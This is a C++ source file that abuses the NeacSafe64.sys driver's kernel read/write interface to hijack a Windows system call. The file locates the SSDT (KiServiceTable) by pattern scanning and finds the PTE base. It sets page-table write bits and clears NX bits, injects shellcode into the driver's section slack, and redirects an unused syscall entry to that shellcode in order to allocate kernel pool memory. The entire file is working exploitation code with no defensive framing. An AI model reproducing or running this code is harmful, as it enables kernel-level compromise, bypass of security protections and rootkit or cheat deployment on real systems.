#include "SyscallHijack.hpp"
#include "PoolShellcode.hpp"
#include <cstdio>
#include <cstring>

#ifndef NTSTATUS
typedef long NTSTATUS;
#endif
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000)
#endif

// Syscall stub patterns - functions that just return STATUS_NOT_IMPLEMENTED
static const uint8_t STUB_PATTERN_1[] = { 0xB8, 0x01, 0x00, 0x00, 0xC0 }; // mov eax, 0xC0000001
static const uint8_t STUB_PATTERN_2[] = { 0xB8, 0x02, 0x00, 0x00, 0xC0 }; // mov eax, 0xC0000002  
static const uint8_t STUB_PATTERN_3[] = { 0xB8, 0xBB, 0x00, 0x00, 0xC0 }; // mov eax, 0xC00000BB (NOT_SUPPORTED)

SyscallHijack::SyscallHijack(NeacInterface* neac)
    : m_Neac(neac)
    , m_KiServiceTable(nullptr)
    , m_KeServiceDescriptorTableShadow(nullptr)
    , m_PteBase(nullptr)
    , m_ExAllocatePool2(nullptr)
    , m_SsdtSize(0)
    , m_IsPool2(true)
    , m_HijackedSyscallIndex(-1)
    , m_OriginalSyscallOffset(0)
    , m_ShellcodeAddress(nullptr)
    , m_ShellcodeSize(0)
    , m_KiServiceTablePDE(nullptr)
    , m_OriginalPDEFlags(0)
    , m_PDEModified(false)
    , m_SharedMemory(nullptr)
    , m_SharedMemoryKernel(nullptr)
    , m_CR0BypassShellcode(nullptr)
{
}

SyscallHijack::~SyscallHijack() {
    Cleanup();
}

void SyscallHijack::Cleanup() {
    if (m_HijackedSyscallIndex >= 0) {
        RestoreSyscall();
    }
    if (m_PDEModified) {
        RestorePDE();
    }
    if (m_SharedMemory) {
        VirtualFree(m_SharedMemory, 0, MEM_RELEASE);
        m_SharedMemory = nullptr;
    }
}

bool SyscallHijack::Initialize() {
    if (!FindKernelAddresses()) {
        printf("[!] Failed to find kernel addresses\n");
        return false;
    }
    
    if (!FindPteBase()) {
        printf("[!] Failed to find PTE base\n");
        return false;
    }
    
    return true;
}

bool SyscallHijack::FindKernelAddresses() {
    void* kernelBase = m_Neac->GetKernelBase();
    if (!kernelBase) return false;

    // Get ExAllocatePool2 (Windows 10 2004+) or ExAllocatePoolWithTag
    m_ExAllocatePool2 = m_Neac->GetKernelExport("ExAllocatePool2");
    if (!m_ExAllocatePool2) {
        m_ExAllocatePool2 = m_Neac->GetKernelExport("ExAllocatePoolWithTag");
        if (!m_ExAllocatePool2) {
            printf("[!] Could not find pool allocation function\n");
            return false;
        }
        m_IsPool2 = false;
        printf("[+] Using ExAllocatePoolWithTag at %p\n", m_ExAllocatePool2);
    } else {
        m_IsPool2 = true;
        printf("[+] Using ExAllocatePool2 at %p\n", m_ExAllocatePool2);
    }

    // Find KiServiceTable via pattern scanning
    // Try multiple exported functions that reference the SSDT
    void* scanStart = nullptr;
    
    // Method 1: KiSystemServiceStart (best option)
    scanStart = m_Neac->GetKernelExport("KiSystemServiceStart");
    if (scanStart) {
        printf("[*] Scanning from KiSystemServiceStart at %p\n", scanStart);
        m_KiServiceTable = FindSsdtViaPatternScan(scanStart);
    }
    
    // Method 2: KeAddSystemServiceTable
    if (!m_KiServiceTable) {
        scanStart = m_Neac->GetKernelExport("KeAddSystemServiceTable");
        if (scanStart) {
            printf("[*] Scanning from KeAddSystemServiceTable at %p\n", scanStart);
            m_KiServiceTable = FindSsdtViaPatternScan(scanStart);
        }
    }
    
    // Method 3: Scan from kernel base (slow but reliable)
    if (!m_KiServiceTable) {
        printf("[*] Scanning from kernel base at %p (this may take a moment)\n", kernelBase);
        m_KiServiceTable = FindSsdtViaPatternScan(kernelBase);
    }

    if (!m_KiServiceTable) {
        printf("[!] Could not locate KiServiceTable via pattern scan\n");
        return false;
    }

    return m_SsdtSize > 0;
}

void* SyscallHijack::FindSsdtViaPatternScan(void* startAddr) {
    // Multiple patterns to find KiServiceTable reference:
    // Pattern 1: lea r10, [rip+offset] = 4C 8D 15 xx xx xx xx
    // Pattern 2: lea r11, [rip+offset] = 4C 8D 1D xx xx xx xx  
    // Pattern 3: lea rax, [rip+offset] = 48 8D 05 xx xx xx xx
    // Pattern 4: mov r10, [rip+offset] = 4C 8B 15 xx xx xx xx
    
    const size_t SCAN_RANGE = 0x800000; // 8MB scan range
    const size_t BUFFER_SIZE = 4096;
    
    uint8_t* buffer = new uint8_t[BUFFER_SIZE];
    if (!buffer) return nullptr;
    
    printf("[*] Pattern scanning for SSDT (range: 0x%zX bytes)...\n", SCAN_RANGE);
    
    int candidatesChecked = 0;
    
    for (size_t offset = 0; offset < SCAN_RANGE; offset += BUFFER_SIZE - 16) {
        if (!m_Neac->KernelRead(buffer, (uint8_t*)startAddr + offset, (uint32_t)BUFFER_SIZE)) {
            printf("[!] Read failed at offset 0x%zX\n", offset);
            break;
        }
        
        for (size_t i = 0; i < BUFFER_SIZE - 16; i++) {
            bool isMatch = false;
            
            // Pattern 1 & 2: lea r10/r11, [rip+disp32]
            if (buffer[i] == 0x4C && buffer[i+1] == 0x8D && 
                (buffer[i+2] == 0x15 || buffer[i+2] == 0x1D)) {
                isMatch = true;
            }
            // Pattern 3: lea rax, [rip+disp32]
            else if (buffer[i] == 0x48 && buffer[i+1] == 0x8D && buffer[i+2] == 0x05) {
                isMatch = true;
            }
            // Pattern 4: mov r10, [rip+disp32]
            else if (buffer[i] == 0x4C && buffer[i+1] == 0x8B && buffer[i+2] == 0x15) {
                isMatch = true;
            }
            
            if (!isMatch) continue;
            
            // Decode RIP-relative offset
            int32_t relOffset = *(int32_t*)&buffer[i+3];
            void* instructionAddr = (uint8_t*)startAddr + offset + i;
            void* potentialTable = (uint8_t*)instructionAddr + 7 + relOffset;
            
            // Validate: address should be in kernel range (relaxed check)
            uint64_t addr = (uint64_t)potentialTable;
            if (addr < 0xFFFFF80000000000ULL || addr > 0xFFFFFFFFFFFFFFF0ULL) {
                continue;
            }
            
            // Read first few entries to validate it's the SSDT
            uint32_t entries[8];
            if (!m_Neac->KernelRead(entries, potentialTable, sizeof(entries))) {
                continue;
            }
            
            candidatesChecked++;
            
            // SSDT entries are 32-bit encoded offsets
            // Format: (offset << 4) | argCount
            // CRITICAL: Real SSDT entries have NEGATIVE offsets (handlers are BEFORE the table)
            // First entry should decode to a negative offset pointing to NtAccessCheck
            
            int32_t firstOffset = (int32_t)entries[0] >> 4;
            
            // Real SSDT: first offset is large negative (e.g., -0x100000 to -0x10000)
            // The handler is typically 64KB-1MB before the table
            if (firstOffset >= 0 || firstOffset < -0x2000000) {
                continue; // Not a real SSDT - handlers should be before table
            }
            
            // Validate first handler points to valid kernel code
            void* firstHandler = (uint8_t*)potentialTable + firstOffset;
            uint64_t handlerAddr = (uint64_t)firstHandler;
            if (handlerAddr < 0xFFFFF80000000000ULL || handlerAddr > 0xFFFFFFFFFFFFFFF0ULL) {
                continue;
            }
            
            // Try to read first bytes of handler - should be valid code
            uint8_t handlerBytes[8];
            if (!m_Neac->KernelRead(handlerBytes, firstHandler, sizeof(handlerBytes))) {
                continue;
            }
            
            // Basic code validation: shouldn't be all zeros or all 0xCC (int3)
            bool looksLikeCode = false;
            for (int j = 0; j < 8; j++) {
                if (handlerBytes[j] != 0x00 && handlerBytes[j] != 0xCC) {
                    looksLikeCode = true;
                    break;
                }
            }
            if (!looksLikeCode) continue;
            
            // Check multiple entries have similar pattern (all negative offsets)
            int validCount = 0;
            for (int j = 0; j < 8; j++) {
                if (entries[j] == 0) continue;
                int32_t off = (int32_t)entries[j] >> 4;
                if (off < 0 && off > -0x2000000) {
                    validCount++;
                }
            }
            if (validCount < 4) continue;
            
            m_SsdtSize = 500; // Default Windows 11 size
            
            printf("[+] Found KiServiceTable at %p (checked %d candidates)\n", potentialTable, candidatesChecked);
            printf("[+] First entries: 0x%08X 0x%08X 0x%08X 0x%08X\n", 
                entries[0], entries[1], entries[2], entries[3]);
            
            // Show first handler address for verification
            printf("[+] First handler (NtAccessCheck): %p\n", firstHandler);
            
            delete[] buffer;
            return potentialTable;
        }
    }
    
    printf("[*] Checked %d candidates, none valid\n", candidatesChecked);
    delete[] buffer;
    return nullptr;
}

bool SyscallHijack::FindPteBase() {
    // Method 1: Try MiGetPteAddress export (unlikely to work on modern Windows)
    void* miGetPteAddress = m_Neac->GetKernelExport("MiGetPteAddress");
    if (miGetPteAddress) {
        m_Neac->KernelRead(&m_PteBase, (uint8_t*)miGetPteAddress + 0x13, sizeof(void*));
        if (m_PteBase) {
            printf("[+] PTE Base (via MiGetPteAddress): %p\n", m_PteBase);
            return true;
        }
    }
    
    // Method 2: Try direct write test - SSDT might already be writable
    // If we can write to KiServiceTable, we don't need PTE manipulation
    printf("[*] Testing if SSDT is already writable...\n");
    uint32_t testVal;
    if (m_Neac->KernelRead(&testVal, m_KiServiceTable, sizeof(testVal))) {
        // Try to write the same value back
        if (m_Neac->KernelWrite(m_KiServiceTable, &testVal, sizeof(testVal))) {
            printf("[+] SSDT is writable! No PTE manipulation needed.\n");
            m_PteBase = nullptr; // Mark that we don't need PTE
            m_PDEModified = false;
            return true;
        }
    }
    
    // Method 3: Scan for PTE base in MmGetPhysicalAddress or similar
    printf("[*] Scanning for PTE base reference...\n");
    void* mmGetPhysAddr = m_Neac->GetKernelExport("MmGetPhysicalAddress");
    if (mmGetPhysAddr) {
        uint8_t funcBytes[256];
        if (m_Neac->KernelRead(funcBytes, mmGetPhysAddr, sizeof(funcBytes))) {
            // Look for mov reg, [rip+offset] pattern that loads PTE base
            for (size_t i = 0; i < sizeof(funcBytes) - 10; i++) {
                // Pattern: 48 8B xx xx xx xx xx (mov rax/rcx/rdx, [rip+disp32])
                if (funcBytes[i] == 0x48 && funcBytes[i+1] == 0x8B) {
                    uint8_t modrm = funcBytes[i+2];
                    // Check for RIP-relative addressing (mod=00, r/m=101)
                    if ((modrm & 0xC7) == 0x05) {
                        int32_t relOffset = *(int32_t*)&funcBytes[i+3];
                        void* targetAddr = (uint8_t*)mmGetPhysAddr + i + 7 + relOffset;
                        
                        // Read potential PTE base
                        void* potentialPteBase;
                        if (m_Neac->KernelRead(&potentialPteBase, targetAddr, sizeof(potentialPteBase))) {
                            uint64_t pteVal = (uint64_t)potentialPteBase;
                            // PTE base is typically in high kernel range
                            if (pteVal >= 0xFFFF800000000000ULL && pteVal <= 0xFFFFFFFFFFFFFFF0ULL) {
                                m_PteBase = potentialPteBase;
                                printf("[+] PTE Base (via pattern scan): %p\n", m_PteBase);
                                return true;
                            }
                        }
                    }
                }
            }
        }
    }
    
    // Method 4: Use hardcoded calculation (Windows 10/11)
    // PTE base follows pattern based on kernel ASLR
    // We can calculate it from a known PTE if we find one
    printf("[!] Could not find PTE base - SSDT modification may fail\n");
    printf("[*] Continuing without PTE base (hoping SSDT is writable)...\n");
    m_PteBase = nullptr;
    return true; // Don't fail, try to continue
}

void* SyscallHijack::GetSyscallHandler(int index) {
    if (!m_KiServiceTable || index < 0 || (uint32_t)index >= m_SsdtSize) {
        return nullptr;
    }
    
    // Read the offset from KiServiceTable[index]
    uint32_t offset;
    void* entryAddr = (uint8_t*)m_KiServiceTable + (index * 4);
    if (!m_Neac->KernelRead(&offset, entryAddr, sizeof(offset))) {
        return nullptr;
    }
    
    // Convert offset to actual address: KiServiceTable + (offset >> 4)
    int32_t signedOffset = (int32_t)offset >> 4;
    return (uint8_t*)m_KiServiceTable + signedOffset;
}

bool SyscallHijack::IsStubFunction(const uint8_t* bytes, size_t len) {
    if (len < 6) return false;
    
    // Check for mov eax, STATUS_xxx; ret pattern
    if (bytes[0] == 0xB8 && bytes[5] == 0xC3) {
        // Check if it's returning an error status (0xC0xxxxxx)
        if (bytes[4] == 0xC0) {
            return true;
        }
    }
    
    // Also check for xor eax, eax; ret (returns STATUS_SUCCESS but does nothing)
    if (bytes[0] == 0x33 && bytes[1] == 0xC0 && bytes[2] == 0xC3) {
        return true;
    }
    
    // Check for ret only (very short stub)
    if (bytes[0] == 0xC3) {
        return true;
    }
    
    return false;
}

int SyscallHijack::FindUnusedSyscall() {
    printf("[*] Scanning for unused syscall stubs...\n");
    
    // Scan from the end of the table (higher indices are typically rarer/newer)
    for (int i = (int)m_SsdtSize - 1; i >= 200; i--) {  // Skip common syscalls (< 200)
        void* handler = GetSyscallHandler(i);
        if (!handler) continue;
        
        uint8_t bytes[16];
        if (!m_Neac->KernelRead(bytes, handler, sizeof(bytes))) {
            continue;
        }
        
        if (IsStubFunction(bytes, sizeof(bytes))) {
            printf("[+] Found stub syscall at index %d (0x%X) -> %p\n", i, i, handler);
            printf("    Bytes: %02X %02X %02X %02X %02X %02X\n", 
                bytes[0], bytes[1], bytes[2], bytes[3], bytes[4], bytes[5]);
            return i;
        }
    }
    
    printf("[!] No suitable stub syscall found\n");
    return -1;
}

void* SyscallHijack::GetPDEAddress(void* virtualAddress) {
    // PDE address calculation for Windows x64
    // PDE = PTE_BASE + ((VA >> 21) << 3)
    // But we need the actual PDE, not PTE
    
    uint64_t va = (uint64_t)virtualAddress;
    
    // For large pages (2MB), the PDE is at:
    // PTE_BASE + ((VA >> 12) & 0xFFFFFFFFFFF8) for PTE
    // For PDE: PTE_BASE + 0x7D8000000000 + ((VA >> 21) << 3)
    // Simplified: use the formula from the exploit
    
    uint64_t pteBase = (uint64_t)m_PteBase;
    
    // Calculate PTE address first
    uint64_t pteAddr = pteBase + ((va >> 12) << 3);
    
    // PDE is the PTE of the PTE address
    uint64_t pdeAddr = pteBase + ((pteAddr >> 12) << 3);
    
    return (void*)pdeAddr;
}

void* SyscallHijack::GetPTEAddress(void* virtualAddress) {
    // PTE address calculation for Windows x64
    // PTE = PTE_BASE + ((VA >> 12) << 3)
    
    if (!m_PteBase) {
        return nullptr;
    }
    
    uint64_t va = (uint64_t)virtualAddress;
    uint64_t pteBase = (uint64_t)m_PteBase;
    
    // Calculate PTE address
    uint64_t pteAddr = pteBase + ((va >> 12) << 3);
    
    return (void*)pteAddr;
}

bool SyscallHijack::MakeAddressExecutable(void* address) {
    // Make a page executable by clearing the NX bit in its PTE
    // NX bit is bit 63 of the PTE
    
    printf("[*] Making address %p executable...\n", address);
    
    void* pte = GetPTEAddress(address);
    if (!pte) {
        printf("[!] Could not calculate PTE address (no PTE base)\n");
        // Try alternative: use CR0.WP bypass and hope the page is already executable
        return true;  // Continue anyway
    }
    
    printf("[*] PTE address: %p\n", pte);
    
    // Read current PTE
    uint64_t pteValue;
    if (!m_Neac->KernelRead(&pteValue, pte, sizeof(pteValue))) {
        printf("[!] Failed to read PTE\n");
        return false;
    }
    
    printf("[+] Current PTE value: 0x%llX\n", pteValue);
    
    // Check if NX bit is set
    if (pteValue & (1ULL << 63)) {
        printf("[*] NX bit is set, clearing it...\n");
        
        // Clear NX bit (bit 63)
        uint64_t newPteValue = pteValue & ~(1ULL << 63);
        
        // Write back - this may require CR0.WP bypass
        if (!m_Neac->KernelWrite(pte, &newPteValue, sizeof(newPteValue))) {
            printf("[!] Failed to write PTE (page may be read-only)\n");
            return false;
        }
        
        printf("[+] NX bit cleared, new PTE: 0x%llX\n", newPteValue);
    } else {
        printf("[+] NX bit already clear, page is executable\n");
    }
    
    return true;
}

bool SyscallHijack::MakeAddressWritable(void* address) {
    // Make a page writable by setting the R/W bit in its PTE
    // R/W bit is bit 1 of the PTE
    
    printf("[*] Making address %p writable...\n", address);
    
    void* pte = GetPTEAddress(address);
    if (!pte) {
        printf("[!] Could not calculate PTE address (no PTE base)\n");
        return false;
    }
    
    printf("[*] PTE address: %p\n", pte);
    
    // Read current PTE
    uint64_t pteValue;
    if (!m_Neac->KernelRead(&pteValue, pte, sizeof(pteValue))) {
        printf("[!] Failed to read PTE\n");
        return false;
    }
    
    printf("[+] Current PTE value: 0x%llX\n", pteValue);
    
    // Check if R/W bit is clear
    if (!(pteValue & (1ULL << 1))) {
        printf("[*] R/W bit is clear, setting it...\n");
        
        // Set R/W bit (bit 1)
        uint64_t newPteValue = pteValue | (1ULL << 1);
        
        // Write back
        if (!m_Neac->KernelWrite(pte, &newPteValue, sizeof(newPteValue))) {
            printf("[!] Failed to write PTE\n");
            return false;
        }
        
        printf("[+] R/W bit set, new PTE: 0x%llX\n", newPteValue);
    } else {
        printf("[+] R/W bit already set, page is writable\n");
    }
    
    return true;
}

bool SyscallHijack::FlipPDEWriteBit() {
    // If we don't have PTE base, try direct write (it might already be writable)
    if (!m_PteBase) {
        printf("[*] No PTE base available, assuming SSDT is writable...\n");
        m_PDEModified = false;
        return true;
    }
    
    m_KiServiceTablePDE = GetPDEAddress(m_KiServiceTable);
    if (!m_KiServiceTablePDE) {
        printf("[!] Could not calculate PDE address\n");
        return false;
    }
    printf("[*] KiServiceTable PDE at: %p\n", m_KiServiceTablePDE);
    
    // Read current PDE flags
    if (!m_Neac->KernelRead(&m_OriginalPDEFlags, m_KiServiceTablePDE, sizeof(m_OriginalPDEFlags))) {
        printf("[!] Failed to read PDE\n");
        return false;
    }
    printf("[+] Original PDE flags: 0x%llX\n", m_OriginalPDEFlags);
    
    // Flip the R/W bit (bit 1)
    uint64_t newFlags = m_OriginalPDEFlags | (1ULL << 1);  // Set write bit
    
    if (!m_Neac->KernelWrite(m_KiServiceTablePDE, &newFlags, sizeof(newFlags))) {
        printf("[!] Failed to write PDE\n");
        return false;
    }
    
    m_PDEModified = true;
    printf("[+] PDE write bit enabled\n");
    return true;
}

bool SyscallHijack::RestorePDE() {
    if (!m_PDEModified || !m_KiServiceTablePDE) return true;
    
    if (!m_Neac->KernelWrite(m_KiServiceTablePDE, &m_OriginalPDEFlags, sizeof(m_OriginalPDEFlags))) {
        printf("[!] Failed to restore PDE\n");
        return false;
    }
    
    m_PDEModified = false;
    printf("[+] PDE restored\n");
    return true;
}

bool SyscallHijack::FindShellcodeLocation() {
    // Find slack space in NeacSafe64.sys for our shellcode
    void* neacBase = m_Neac->FindKernelModule(L"NeacSafe64.sys");
    if (!neacBase) {
        printf("[!] Could not find NeacSafe64.sys\n");
        return false;
    }
    
    printf("[*] Searching for shellcode location in NeacSafe64.sys at %p\n", neacBase);
    
    // Read PE headers
    IMAGE_DOS_HEADER dosHeader;
    if (!m_Neac->KernelRead(&dosHeader, neacBase, sizeof(dosHeader))) {
        return false;
    }
    
    IMAGE_NT_HEADERS64 ntHeaders;
    if (!m_Neac->KernelRead(&ntHeaders, (uint8_t*)neacBase + dosHeader.e_lfanew, sizeof(ntHeaders))) {
        return false;
    }
    
    // Look for .data or .rdata section with slack space
    void* sectionAddr = (uint8_t*)neacBase + dosHeader.e_lfanew + 
        sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) + ntHeaders.FileHeader.SizeOfOptionalHeader;
    
    for (WORD i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER section;
        if (!m_Neac->KernelRead(&section, (uint8_t*)sectionAddr + i * sizeof(IMAGE_SECTION_HEADER), sizeof(section))) {
            continue;
        }
        
        char name[9] = {0};
        memcpy(name, section.Name, 8);
        
        // Look for .data section (writable)
        if (strcmp(name, ".data") == 0 || strcmp(name, ".rdata") == 0) {
            // Use end of section for our shellcode
            size_t sectionEnd = section.VirtualAddress + section.Misc.VirtualSize;
            size_t alignedEnd = (sectionEnd + 0xF) & ~0xF;  // 16-byte align
            
            // Check if there's slack at the end of the section
            size_t rawEnd = section.VirtualAddress + section.SizeOfRawData;
            if (rawEnd > alignedEnd + PoolShellcode::SHELLCODE_SIZE) {
                m_ShellcodeAddress = (uint8_t*)neacBase + alignedEnd;
                m_ShellcodeSize = PoolShellcode::SHELLCODE_SIZE;
                printf("[+] Found shellcode location in section '%s' at %p\n", name, m_ShellcodeAddress);
                return true;
            }
        }
    }
    
    // Fallback: use a location in the PAGE section
    for (WORD i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++) {
        IMAGE_SECTION_HEADER section;
        if (!m_Neac->KernelRead(&section, (uint8_t*)sectionAddr + i * sizeof(IMAGE_SECTION_HEADER), sizeof(section))) {
            continue;
        }
        
        char name[9] = {0};
        memcpy(name, section.Name, 8);
        
        if (strncmp(name, "PAGE", 4) == 0) {
            // Use some offset into the PAGE section
            m_ShellcodeAddress = (uint8_t*)neacBase + section.VirtualAddress + 
                section.Misc.VirtualSize - PoolShellcode::SHELLCODE_SIZE - 0x100;
            m_ShellcodeSize = PoolShellcode::SHELLCODE_SIZE;
            printf("[+] Using PAGE section for shellcode at %p\n", m_ShellcodeAddress);
            return true;
        }
    }
    
    printf("[!] Could not find suitable shellcode location\n");
    return false;
}

bool SyscallHijack::InjectShellcode() {
    // Prepare patched shellcode - use correct version based on API
    uint8_t shellcode[PoolShellcode::SHELLCODE_SIZE];
    size_t actualSize = PoolShellcode::GetPatchedShellcode(shellcode, m_ExAllocatePool2, m_IsPool2);
    
    printf("[*] Injecting shellcode at %p (%zu bytes, %s)\n", 
        m_ShellcodeAddress, actualSize,
        m_IsPool2 ? "ExAllocatePool2" : "ExAllocatePoolWithTag");
    
    // Try to make the shellcode address writable before writing
    if (m_PteBase) {
        MakeAddressWritable(m_ShellcodeAddress);
    }
    
    // Write shellcode to kernel memory
    if (!m_Neac->KernelWrite(m_ShellcodeAddress, shellcode, (uint32_t)actualSize)) {
        printf("[!] Failed to write shellcode\n");
        return false;
    }
    
    // Make the shellcode address executable (clear NX bit)
    if (m_PteBase) {
        if (!MakeAddressExecutable(m_ShellcodeAddress)) {
            printf("[!] Warning: Could not make shellcode executable, execution may fail\n");
            // Continue anyway - the pool allocation may have been executable
        }
    } else {
        printf("[*] No PTE base, assuming shellcode location is already executable\n");
    }
    
    printf("[+] Shellcode injected successfully\n");
    return true;
}

bool SyscallHijack::HijackSyscall() {
    // Find an unused syscall
    m_HijackedSyscallIndex = FindUnusedSyscall();
    if (m_HijackedSyscallIndex < 0) {
        printf("[!] No unused syscall found\n");
        return false;
    }
    
    // Read original syscall offset
    void* entryAddr = (uint8_t*)m_KiServiceTable + (m_HijackedSyscallIndex * 4);
    if (!m_Neac->KernelRead(&m_OriginalSyscallOffset, entryAddr, sizeof(m_OriginalSyscallOffset))) {
        printf("[!] Failed to read original syscall offset\n");
        return false;
    }
    printf("[+] Original syscall offset: 0x%08X\n", m_OriginalSyscallOffset);
    
    // Calculate new offset for our shellcode
    // SSDT format: (offset << 4) | (argCount & 0xF)
    // The offset is signed and relative to KiServiceTable
    int64_t delta = (int64_t)m_ShellcodeAddress - (int64_t)m_KiServiceTable;
    
    // Validate delta fits in 28 bits (signed)
    if (delta > 0x7FFFFFF || delta < -0x8000000) {
        printf("[!] Shellcode too far from KiServiceTable (delta: 0x%llX)\n", delta);
        printf("[!] Max supported offset: +/- 128MB\n");
        return false;
    }
    
    // Preserve the argument count from original syscall (lower 4 bits)
    uint8_t argCount = m_OriginalSyscallOffset & 0xF;
    // Our shellcode takes 2 args (size, output), so set argCount to 2 if needed
    argCount = 2;  // RCX=size, RDX=output addr
    
    uint32_t newOffset = ((uint32_t)(delta & 0x0FFFFFFF) << 4) | (argCount & 0xF);
    
    printf("[*] New syscall offset: 0x%08X (delta: 0x%llX, args: %d)\n", newOffset, delta, argCount);
    
    // Make KiServiceTable writable
    if (!FlipPDEWriteBit()) {
        return false;
    }
    
    // Write new offset
    if (!m_Neac->KernelWrite(entryAddr, &newOffset, sizeof(newOffset))) {
        printf("[!] Failed to write new syscall offset\n");
        RestorePDE();
        return false;
    }
    
    printf("[+] Syscall %d hijacked to shellcode\n", m_HijackedSyscallIndex);
    return true;
}

bool SyscallHijack::RestoreSyscall() {
    if (m_HijackedSyscallIndex < 0) return true;
    
    void* entryAddr = (uint8_t*)m_KiServiceTable + (m_HijackedSyscallIndex * 4);
    if (!m_Neac->KernelWrite(entryAddr, &m_OriginalSyscallOffset, sizeof(m_OriginalSyscallOffset))) {
        printf("[!] Failed to restore syscall\n");
        return false;
    }
    
    printf("[+] Syscall %d restored\n", m_HijackedSyscallIndex);
    m_HijackedSyscallIndex = -1;
    return true;
}

bool SyscallHijack::ExecuteHijackedSyscall(size_t size, void* outputAddr) {
    // We need to call the hijacked syscall
    // The syscall will be: NtXxx(size, outputAddr)
    
    printf("[*] Executing hijacked syscall %d with size=0x%zX, output=%p\n", 
        m_HijackedSyscallIndex, size, outputAddr);
    
    // Create syscall stub dynamically (inline asm not available in MSVC x64)
    uint8_t syscallStub[] = {
        0x4C, 0x8B, 0xD1,                   // mov r10, rcx
        0xB8, 0x00, 0x00, 0x00, 0x00,       // mov eax, <syscall_number>
        0x0F, 0x05,                         // syscall
        0xC3                                // ret
    };
    
    // Patch syscall number
    *(uint32_t*)(syscallStub + 4) = (uint32_t)m_HijackedSyscallIndex;
    
    // Allocate executable memory for stub
    void* execMem = VirtualAlloc(NULL, sizeof(syscallStub), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!execMem) {
        printf("[!] Failed to allocate executable memory\n");
        return false;
    }
    
    memcpy(execMem, syscallStub, sizeof(syscallStub));
    
    // Cast to function pointer and call
    typedef NTSTATUS (*SyscallFunc_t)(SIZE_T, PVOID);
    SyscallFunc_t syscallFunc = (SyscallFunc_t)execMem;
    
    NTSTATUS status = syscallFunc(size, outputAddr);
    
    VirtualFree(execMem, 0, MEM_RELEASE);
    
    printf("[+] Syscall returned: 0x%08X\n", status);
    return NT_SUCCESS(status);
}

void* SyscallHijack::AllocateKernelPool(size_t size) {
    printf("\n[*] === Starting Kernel Pool Allocation via Syscall Hijack ===\n");
    
    // Initialize
    if (!Initialize()) {
        return nullptr;
    }
    
    // Find shellcode location
    if (!FindShellcodeLocation()) {
        return nullptr;
    }
    
    // Inject shellcode
    if (!InjectShellcode()) {
        return nullptr;
    }
    
    // Hijack syscall
    if (!HijackSyscall()) {
        return nullptr;
    }
    
    // Allocate shared memory for result
    m_SharedMemory = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!m_SharedMemory) {
        printf("[!] Failed to allocate shared memory\n");
        Cleanup();
        return nullptr;
    }
    
    // We need a kernel-accessible address for the result
    // Option 1: Use MDL to map user memory to kernel
    // Option 2: Write result to a known kernel location and read it back
    // Option 3: Use the return value directly
    
    // For simplicity, we'll modify the shellcode to store the result in a 
    // known location in NeacSafe64's .data section
    void* resultLocation = (uint8_t*)m_ShellcodeAddress + PoolShellcode::SHELLCODE_SIZE + 0x10;
    
    // Initialize result location to 0
    uint64_t zero = 0;
    m_Neac->KernelWrite(resultLocation, &zero, sizeof(zero));
    
    // Execute the hijacked syscall
    if (!ExecuteHijackedSyscall(size, resultLocation)) {
        printf("[!] Syscall execution failed\n");
        Cleanup();
        return nullptr;
    }
    
    // Read the allocated address from kernel memory
    void* allocatedAddr = nullptr;
    if (!m_Neac->KernelRead(&allocatedAddr, resultLocation, sizeof(allocatedAddr))) {
        printf("[!] Failed to read allocated address\n");
        Cleanup();
        return nullptr;
    }
    
    printf("[+] Kernel pool allocated at: %p\n", allocatedAddr);
    
    // Cleanup syscall hijack (but keep the allocated memory!)
    RestoreSyscall();
    RestorePDE();
    
    return allocatedAddr;
}
